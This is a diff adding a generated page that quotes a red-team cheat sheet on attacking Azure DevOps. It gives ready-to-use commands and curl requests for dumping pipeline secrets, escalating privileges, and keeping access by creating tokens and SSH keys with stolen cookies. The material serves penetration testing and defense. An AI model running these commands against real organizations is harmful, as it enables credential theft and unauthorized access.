@@ -1,0 +1,100 @@
+---
+parsed_by: focuslocust
+source: internalallthethings
+type: generated
+---
+# Azure Services - Azure DevOps
+
+[Home](../../../README.md)
+
+## Provenance
+
+| Field | Value |
+| --- | --- |
+| Source | `internalallthethings` |
+| Type | `internal-topic` |
+| Record ID | `iatt-cloud-azure-azure-services-devops` |
+| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-services-devops.md` |
+| Parsed by | `focuslocust` |
+| Relationship mode | `explicit / conservative inferred / manual` |
+
+## Generated Concept Page
+
+- [Azure Services - Azure DevOps](../../topics/cloud/azure-services-azure-devops.md)
+
+## Extracted Fields
+
+| Field | Value |
+| --- | --- |
+| id | iatt-cloud-azure-azure-services-devops |
+| name | Azure Services - Azure DevOps |
+| type | internal-topic |
+| source | internalallthethings |
+| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/azure/azure-services-devops.md |
+
+## Preserved Source Material
+
+````yaml
+_body: "# Azure Services - Azure DevOps\n\n* [xforcered/ADOKit](https://github.com/xforcered/ADOKit) - Azure DevOps Services\
+  \ Attack Toolkit\n* [zolderio/devops](https://github.com/zolderio/devops) - Azure DevOps Access Testing Scripts\n* [synacktiv/nord-stream](https://github.com/synacktiv/nord-stream)\
+  \ - Nord Stream is a tool that allows you to extract secrets stored inside CI/CD environments by deploying malicious pipelines.\
+  \ It currently supports Azure DevOps, GitHub and GitLab.\n\n    ```ps1\n    # List all secrets from all projects\n    $\
+  \ nord-stream.py devops --token \"$PAT\" --org myorg --list-secrets\n\n    # Dump all secrets from all projects\n    $ nord-stream.py\
+  \ devops --token \"$PAT\" --org myorg\n    ```\n\n## Authentication\n\nYou can access an organization's Azure DevOps Services\
+  \ instance via <https://dev.azure.com/{yourorganization}>.\n\n* Username and Password\n* Authentication Cookie `UserAuthentication`:\
+  \ `ADOKit.exe whoami /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization`\n* Personal Access\
+  \ Token (PAT): `ADOKit.exe whoami /credential:patToken /url:https://dev.azure.com/YourOrganization`\n\n    ```ps1\n    PAT=\"\
+  XXXXXXXXXXX\"\n    organization=\"YOURORGANIZATION\"\n    curl -u :${PAT} https://dev.azure.com/${organization}/_apis/build-release/builds\n\
+  \    ```\n\n* Access Token with FOCI (MS Authenticator)\n\n    ```ps1\n    roadtx auth --device-code -c 4813382a-8fa7-425e-ab75-3b753aab3abb\n\
+  \    roadtx refreshtokento -c 1950a258-227b-4e31-a9cf-717495945fc2 -r 499b84ac-1321-427f-aa17-267ca6975798/.default\n  \
+  \  python main.py --token $(jq -r '.accessToken' .roadtools_auth) repositories\n    ```\n\n## Recon\n\n* Search files: `file:FileNameToSearch`,\
+  \ `file:Test* OR file:azure-pipelines*`\n\n  ```ps1\n  curl -i -s -k -X $'GET'\n  -H $'Content-Type: application/json'\n\
+  \  -H $'User-Agent: SOME_USER_AGENT'\n  -H $'Authorization: Basic BASE64ENCODEDPAT'\n  -H $'Host: dev.azure.com'\n  $'https://dev.azure.com/YOURORGANIZATION/PROJECTNAME/_apis/git/repositories/REPOSITORYID/items?recursionLevel=Full&api-version=7.0'\n\
+  \  ```\n\n* Search code: `ADOKit.exe searchcode /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization\
+  \ /search:\"search term\"`\n\n  ```ps1\n  curl -i -s -k -X $'POST'\n  -H $'Content-Type: application/json'\n  -H $'User-Agent:\
+  \ SOME_USER_AGENT'\n  -H $'Authorization: Basic BASE64ENCODEDPAT'\n  -H $'Host: almsearch.dev.azure.com'\n  -H $'Content-Length:\
+  \ 85'\n  -H $'Expect: 100-continue'\n  -H $'Connection: close'\n  --data-binary $'{\\\"searchText\\\": \\\"SEARCHTERM\\\"\
+  , \\\"skipResults\\\":0,\\\"takeResults\\\":1000,\\\"isInstantSearch\\\":true}' \n  $'https://almsearch.dev.azure.com/YOURORGANIZATION/_apis/search/codeAdvancedQueryResults?api-version=7.0-preview'\n\
+  \  ```\n\n* Enumerate users\n\n  ```ps1\n  curl -i -s -k -X $'GET'\n  -H $'Content-Type: application/json'\n  -H $'User-Agent:\
+  \ SOME_USER_AGENT'\n  -H $'Authorization: Basic BASE64ENCODEDPAT'\n  -H $'Host: dev.azure.com'\n  $'https://dev.azure.com/YOURORGANIZATION/_apis/graph/users?api-version=7.0'\n\
+  \  ```\n\n* Enumerate groups: `ADOKit.exe getgroupmembers /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization\
+  \ /group:\"search term\"`\n\n  ```ps1\n  curl -i -s -k -X $'GET'\n  -H $'Content-Type: application/json'\n  -H $'User-Agent:\
+  \ SOME_USER_AGENT'\n  -H $'Authorization: Basic BASE64ENCODEDPAT'\n  -H $'Host: dev.azure.com'\n  $'https://dev.azure.com/YOURORGANIZATION/_apis/graph/groups?api-version=7.0'\n\
+  \  ```\n\n* Enumerate project permissions: `ADOKit.exe getpermissions /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization\
+  \ /project:\"project name\"`\n\n* Get the user profile of the user from access_token: <https://app.vssps.visualstudio.com/_apis/profile/profiles/me?api-version=7.1>\n\
+  * Get the organizations that user belongs to: <https://app.vssps.visualstudio.com/_apis/accounts?memberId={UserID}?api-version=7.1>\n\
+  * Get the repositories inside of that organization: <https://dev.azure.com/{org_name}/_apis/projects?api-version=7.1>\n\n\
+  ## Privilege Escalation\n\n* Adding User to Group: `ADOKit.exe addcollectionbuildadmin /credential:UserAuthentication=ABC123\
+  \ /url:https://dev.azure.com/YourOrganization /user:\"username\"`\n\n    ```ps1\n    curl -i -s -k -X $'PUT'\n    -H $'Content-Type:\
+  \ application/json'\n    -H $'User-Agent: Some User Agent'\n    -H $'Authorization: Basic base64EncodedPAT'\n    -H $'Host:\
+  \ vssps.dev.azure.com'\n    -H $'Content-Length: 0'\n    $'https://vssps.dev.azure.com/YourOrganization/_apis/graph/memberships/userDescriptor/groupDescriptor?api-version=7.0-preview.1'\n\
+  \    ```\n\n* Retrieve build variables and secrets: `ADOKit.exe getpipelinevars /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization\
+  \ /project:\"project name\"`, `ADOKit.exe getpipelinesecrets /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization\
+  \ /project:\"project name\"`\n\n    ```ps1\n    curl -i -s -k -X $'GET'\n    -H $'Content-Type: application/json'\n    -H\
+  \ $'User-Agent: Some User Agent'\n    -H $'Authorization: Basic base64EncodedPAT'\n    -H $'Host: dev.azure.com'\n    $'https://dev.azure.com/YourOrganization/ProjectName/_apis/build/Definitions/DefinitionIDNumber?api-version=7.0'\n\
+  \    ```\n\n* Retrieve Service Connection Information: `ADOKit.exe getserviceconnections /credential:UserAuthentication=ABC123\
+  \ /url:https://dev.azure.com/YourOrganization /project:\"project name\"`\n\n    ```ps1\n    curl -i -s -k -X $'GET'\n  \
+  \  -H $'Content-Type: application/json;api-version=5.0-preview.1'\n    -H $'User-Agent: Some User Agent'\n    -H $'Authorization:\
+  \ Basic base64EncodedPAT'\n    -H $'Host: dev.azure.com'\n    $'https://dev.azure.com/YourOrganization/YourProject/_apis/serviceendpoint/endpoints?api-version=7.0'\n\
+  \    ```\n\n## Persistence\n\n* Create a PAT: `ADOKit.exe createpat /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization`\n\
+  \n    ```ps1\n    curl -i -s -k -X $'POST'\n    -H $'Content-Type: application/json'\n    -H $'Accept: application/json;api-version=5.0-preview.1'\n\
+  \    -H $'User-Agent: Some User Agent'\n    -H $'Host: dev.azure.com'\n    -H $'Content-Length: 234'\n    -H $'Expect: 100-continue'\n\
+  \    -b $'X-VSS-UseRequestRouting=True; UserAuthentication=stolenCookie'\n    --data-binary $'{\\\"contributionIds\\\":[\\\
+  \"ms.vss-token-web.personal-accesstoken-issue-session-tokenprovider\\\"],\\\"dataProviderContext\\\":{\\\"properties\\\"\
+  :{\\\"displayName\\\":\\\"PATName\\\",\\\"validTo\\\":\\\"YYYY-MMDDT00:00:00.000Z\\\",\\\"scope\\\":\\\"app_token\\\",\\\
+  \"targetAccounts\\\":[]}}}}}'\n    $'https://dev.azure.com/YourOrganization/_apis/Contribution/HierarchyQuery'\n    ```\n\
+  \n* Create SSH Keys: `ADOKit.exe createsshkey /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization\
+  \ /sshkey:\"ssh pub key\"`\n\n    ```ps1\n    curl -i -s -k -X $'POST'\n    -H $'Content-Type: application/json'\n    -H\
+  \ $'Accept: application/json;api-version=5.0-preview.1'\n    -H $'User-Agent: Some User Agent'\n    -H $'Host: dev.azure.com'\n\
+  \    -H $'Content-Length: 856'\n    -H $'Expect: 100-continue'\n    -b $'X-VSS-UseRequestRouting=True; UserAuthentication=stolenCookie'\n\
+  \    --data-binary $'{\\\"contributionIds\\\":[\\\"ms.vss-token-web.personal-accesstoken-issue-session-tokenprovider\\\"\
+  ],\\\"dataProviderContext\\\":{\\\"properties\\\":{\\\"displayName\\\":\\\"SSHKeyName\\\",\\\"publicData\\\":\\\"public\
+  \ SSH key content\\\",\\\"validTo\\\":\\\"YYYY-MMDDT00:00:00.000Z\\\",\\\"scope\\\":\\\"app_token\\\",\\\"isPublic\\\":true,\\\
+  \"targetAccounts\\\":[\\\"organizationID\\\"]}}}}}'\n    $'https://dev.azure.com/YourOrganization/_apis/Contribution/HierarchyQuery'\n\
+  \    ```\n\n## References\n\n* [Hiding in the Clouds: Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic\
+  \ Rules - Brett Hawkins - November 6, 2023](https://www.ibm.com/downloads/cas/5JKAPVYD)\n* [DevOps access is closer than\
+  \ you assume - rikvduijn - January 21, 2025](https://zolder.io/blog/devops-access-is-closer-than-you-assume/)\n* [Training\
+  \ - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)"
+_relative_path: cloud/azure/azure-services-devops.md
+_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-services-devops.md
+````
